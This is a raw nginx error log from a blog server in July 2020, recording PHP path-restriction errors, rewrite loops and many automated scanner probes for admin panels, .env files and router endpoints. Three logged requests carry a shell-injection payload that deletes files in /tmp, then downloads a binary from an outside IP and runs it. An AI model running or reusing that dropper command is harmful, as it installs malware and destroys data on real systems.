2020/07/08 14:17:28 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:19:03 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:19:04 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:19:05 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:19:05 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:19:05 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:20:28 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:28:19 [error] 6#6: *13 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:28:20 [error] 6#6: *13 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:28:21 [error] 6#6: *13 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/09 14:26:09 [error] 6#6: *81 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//phpMyAdmin/", client: 101.132.161.137, server: yhlbk.com, request: "GET /phpMyAdmin/ HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:09 [error] 6#6: *82 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//phpmyadmin/", client: 101.132.161.137, server: yhlbk.com, request: "GET /phpmyadmin/ HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 15:08:24 [error] 6#6: *105 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//explicit_not_exist_path", client: 101.133.140.206, server: yhlbk.com, request: "GET /explicit_not_exist_path HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:24 [error] 6#6: *107 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.html", client: 101.133.140.206, server: yhlbk.com, request: "GET /index.html HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:25 [error] 6#6: *108 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.jsp", client: 101.133.140.206, server: yhlbk.com, request: "GET /index.jsp HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:25 [error] 6#6: *110 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//admin/", client: 101.133.140.206, server: yhlbk.com, request: "GET /admin/ HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:26 [error] 6#6: *111 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 101.133.140.206, server: yhlbk.com, request: "GET /wp-login.php HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "120.77.171.251"
2020/07/09 15:08:26 [error] 6#6: *111 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//readme.html", client: 101.133.140.206, server: yhlbk.com, request: "GET /readme.html HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:26 [error] 6#6: *113 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//license.txt", client: 101.133.140.206, server: yhlbk.com, request: "GET /license.txt HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:26 [error] 6#6: *114 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wp-includes/js/wplink.js", client: 101.133.140.206, server: yhlbk.com, request: "GET /wp-includes/js/wplink.js HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:26 [error] 6#6: *115 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wp-admin/js/customize-controls.js", client: 101.133.140.206, server: yhlbk.com, request: "GET /wp-admin/js/customize-controls.js HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:26 [error] 6#6: *116 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wp-admin/js/nav-menu.js", client: 101.133.140.206, server: yhlbk.com, request: "GET /wp-admin/js/nav-menu.js HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:26 [error] 6#6: *117 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wp-includes/js/plupload/handlers.js", client: 101.133.140.206, server: yhlbk.com, request: "GET /wp-includes/js/plupload/handlers.js HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:26 [error] 6#6: *118 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wp-includes/js/tinymce/wp-tinymce.js.gz", client: 101.133.140.206, server: yhlbk.com, request: "GET /wp-includes/js/tinymce/wp-tinymce.js.gz HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:26 [error] 6#6: *119 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//robots.txt", client: 101.133.140.206, server: yhlbk.com, request: "GET /robots.txt HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:26 [error] 6#6: *120 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php/explicit_not_exist_path", client: 101.133.140.206, server: yhlbk.com, request: "GET /index.php/explicit_not_exist_path HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:26 [error] 6#6: *121 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//static/.gitignore", client: 101.133.140.206, server: yhlbk.com, request: "GET /static/.gitignore HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:26 [error] 6#6: *122 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//4e5e5d7364f443e28fbf0d3ae744a59a", client: 101.133.140.206, server: yhlbk.com, request: "GET /4e5e5d7364f443e28fbf0d3ae744a59a HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:26 [error] 6#6: *123 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//r/cms/www/red/img/prompt.jpg", client: 101.133.140.206, server: yhlbk.com, request: "GET /r/cms/www/red/img/prompt.jpg HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:27 [error] 6#6: *125 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//r/cms/www/red/style/swiper.min.js", client: 101.133.140.206, server: yhlbk.com, request: "GET /r/cms/www/red/style/swiper.min.js HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:27 [error] 6#6: *126 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wcm/", client: 101.133.140.206, server: yhlbk.com, request: "GET /wcm/ HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:27 [error] 6#6: *127 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//phpMyAdmin/", client: 101.133.140.206, server: yhlbk.com, request: "GET /phpMyAdmin/ HTTP/1.1", host: "120.77.171.251"
2020/07/09 15:08:27 [error] 6#6: *128 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//phpmyadmin/", client: 101.133.140.206, server: yhlbk.com, request: "GET /phpmyadmin/ HTTP/1.1", host: "120.77.171.251"
2020/07/09 17:38:56 [error] 6#6: *143 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.169.123, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 17:38:56 [error] 6#6: *144 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.169.123, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 17:38:56 [error] 6#6: *145 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.169.123, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 18:02:32 [error] 6#6: *150 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 220.181.108.176, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 18:56:54 [error] 6#6: *155 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//cache/global/img/gs.gif", client: 80.82.70.187, server: yhlbk.com, request: "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1", host: "www.baidu.com"
2020/07/09 19:57:02 [error] 6#6: *163 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//shell", client: 103.116.164.42, server: yhlbk.com, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+95.213.165.45/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws HTTP/1.1", host: "127.0.0.1:80"
2020/07/09 19:57:04 [error] 6#6: *165 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//shell", client: 103.116.164.42, server: yhlbk.com, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+95.213.165.45/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws HTTP/1.1", host: "127.0.0.1:80"
2020/07/09 20:45:37 [error] 6#6: *173 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 139.162.88.63, server: yhlbk.com, request: "GET http://clientapi.ipip.net/echo.php?info=1234567890 HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "clientapi.ipip.net"
2020/07/09 20:47:10 [error] 6#6: *175 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.207.15, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 20:47:10 [error] 6#6: *176 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.207.15, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 20:47:10 [error] 6#6: *177 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.207.15, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 21:46:15 [error] 6#6: *191 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//ReportServer", client: 192.241.235.85, server: yhlbk.com, request: "GET /ReportServer HTTP/1.1", host: "120.77.171.251"
2020/07/09 22:27:11 [error] 6#6: *200 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//config/getuser", client: 185.39.11.105, server: yhlbk.com, request: "GET /config/getuser?index=0 HTTP/1.1", host: "120.77.171.251:80"
2020/07/09 22:39:21 [error] 6#6: *201 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-3.html", client: 49.7.20.113, server: yhlbk.com, request: "GET /home-3.html HTTP/1.1", host: "www.yhlbk.com"
2020/07/09 22:49:47 [error] 6#6: *205 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//HNAP1/", client: 82.205.22.73, server: yhlbk.com, request: "GET /HNAP1/ HTTP/1.1", host: "120.77.171.251", referrer: "http://120.77.171.251/"
2020/07/09 23:07:21 [error] 6#6: *206 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//sitemap.txt", client: 220.181.51.122, server: yhlbk.com, request: "GET /sitemap.txt HTTP/1.1", host: "www.yhlbk.com"
2020/07/09 23:47:48 [error] 6#6: *208 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//GponForm/diag_Form", client: 49.84.118.234, server: yhlbk.com, request: "POST /GponForm/diag_Form?images/ HTTP/1.1", host: "127.0.0.1:80"
2020/07/10 00:06:18 [error] 6#6: *209 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.207.30, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/10 00:06:18 [error] 6#6: *210 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.207.30, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/10 00:06:18 [error] 6#6: *211 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.207.30, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/10 00:10:31 [error] 6#6: *212 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//shell", client: 102.44.30.23, server: yhlbk.com, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+95.213.165.45/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws HTTP/1.1", host: "127.0.0.1:80"
2020/07/10 00:19:11 [error] 6#6: *214 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//hudson", client: 192.241.212.158, server: yhlbk.com, request: "GET /hudson HTTP/1.1", host: "120.77.171.251"
2020/07/10 01:14:46 [error] 6#6: *221 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//robots.txt", client: 17.58.98.158, server: yhlbk.com, request: "GET /robots.txt HTTP/1.1", host: "yhlbk.com"
2020/07/10 01:14:47 [error] 6#6: *222 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//article-3.html", client: 17.58.100.94, server: yhlbk.com, request: "GET /article-3.html HTTP/1.1", host: "yhlbk.com"
2020/07/10 01:33:37 [error] 6#6: *227 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//.env", client: 54.216.40.76, server: yhlbk.com, request: "GET /.env HTTP/1.1", host: "120.77.171.251"
2020/07/10 02:21:22 [error] 6#6: *231 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//cloud-app/include/css/uncall.css", client: 139.205.177.97, server: yhlbk.com, request: "GET /cloud-app/include/css/uncall.css HTTP/1.1", host: "120.77.171.251"
2020/07/10 02:21:22 [error] 6#6: *232 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//app/common.js", client: 139.205.177.97, server: yhlbk.com, request: "GET /app/common.js?version=2.4.43&build=1563436823 HTTP/1.1", host: "120.77.171.251"
2020/07/10 02:21:22 [error] 6#6: *233 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 139.205.177.97, server: yhlbk.com, request: "GET /recordings/misc/recording_popup.php HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "120.77.171.251"
2020/07/10 02:26:27 [error] 6#6: *235 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//robots.txt", client: 157.55.39.27, server: yhlbk.com, request: "GET /robots.txt HTTP/1.1", host: "yhlbk.com"
2020/07/10 03:00:12 [error] 6#6: *238 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//statics/css/crop.css", client: 39.101.129.127, server: yhlbk.com, request: "GET /statics/css/crop.css HTTP/1.1", host: "yhlbk.com"
2020/07/10 03:07:28 [error] 6#6: *241 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.207.30, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/10 03:07:28 [error] 6#6: *242 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.207.30, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/10 03:07:28 [error] 6#6: *243 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.207.30, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/10 03:26:01 [error] 6#6: *244 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//article-990.html", client: 157.55.39.162, server: yhlbk.com, request: "GET /article-990.html HTTP/1.1", host: "yhlbk.com"
2020/07/10 03:33:15 [error] 6#6: *249 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//article-1083.html", client: 40.77.167.16, server: yhlbk.com, request: "GET /article-1083.html HTTP/1.1", host: "yhlbk.com"
2020/07/10 04:36:14 [error] 6#6: *254 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//cache/global/img/gs.gif", client: 80.82.70.187, server: yhlbk.com, request: "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1", host: "www.baidu.com"
2020/07/10 05:57:02 [error] 6#6: *274 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wp-includes/wlwmanifest.xml", client: 123.30.238.187, server: yhlbk.com, request: "GET /wp-includes/wlwmanifest.xml HTTP/1.1", host: "yhlbk.com"
2020/07/10 05:57:18 [error] 6#6: *275 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wp/wp-includes/wlwmanifest.xml", client: 184.168.200.45, server: yhlbk.com, request: "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1", host: "yhlbk.com"
2020/07/10 05:58:14 [error] 6#6: *277 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//blog/wp-includes/wlwmanifest.xml", client: 182.50.130.22, server: yhlbk.com, request: "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1", host: "yhlbk.com"
2020/07/10 05:58:30 [error] 6#6: *279 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//site/wp-includes/wlwmanifest.xml", client: 132.148.200.97, server: yhlbk.com, request: "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1", host: "yhlbk.com"
2020/07/10 05:58:55 [error] 6#6: *280 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//site/wp-includes/wlwmanifest.xml", client: 185.71.217.173, server: yhlbk.com, request: "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1", host: "yhlbk.com"
2020/07/10 05:59:37 [error] 6#6: *282 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//old/wp-includes/wlwmanifest.xml", client: 160.153.153.28, server: yhlbk.com, request: "GET /old/wp-includes/wlwmanifest.xml HTTP/1.1", host: "yhlbk.com"
2020/07/10 05:59:53 [error] 6#6: *283 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//test/wp-includes/wlwmanifest.xml", client: 160.153.153.31, server: yhlbk.com, request: "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1", host: "yhlbk.com"
2020/07/10 06:00:09 [error] 6#6: *284 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//backup/wp-includes/wlwmanifest.xml", client: 198.71.239.42, server: yhlbk.com, request: "GET /backup/wp-includes/wlwmanifest.xml HTTP/1.1", host: "yhlbk.com"
2020/07/10 06:00:24 [error] 6#6: *285 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//new/wp-includes/wlwmanifest.xml", client: 207.246.240.106, server: yhlbk.com, request: "GET /new/wp-includes/wlwmanifest.xml HTTP/1.1", host: "yhlbk.com"
2020/07/10 06:01:17 [error] 6#6: *286 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.207.30, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/10 06:01:17 [error] 6#6: *287 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.207.30, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
